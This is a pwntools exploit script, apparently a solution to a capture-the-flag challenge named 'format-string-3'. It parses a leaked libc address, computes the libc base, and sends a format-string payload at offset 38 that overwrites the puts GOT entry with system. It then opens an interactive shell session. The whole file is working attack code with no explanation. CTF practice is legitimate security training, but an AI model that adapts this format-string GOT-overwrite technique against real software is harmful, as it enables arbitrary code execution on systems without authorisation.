from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './format-string-3'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
libc = ELF('./libc.so.6')

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()


io.recvuntil(b'libc: ')

leaked_setvbuf = int(io.recv(14).ljust(8,b"\x00"),16) 
log.info(f'Gets leak => {hex(leaked_setvbuf)}')
libc.address = leaked_setvbuf - libc.sym['setvbuf']
log.info(f'LibC Address => {hex(libc.address)}')

payload = fmtstr_payload(38, {elf.got['puts'] : libc.sym['system']})

io.sendline(payload)
io.interactive()

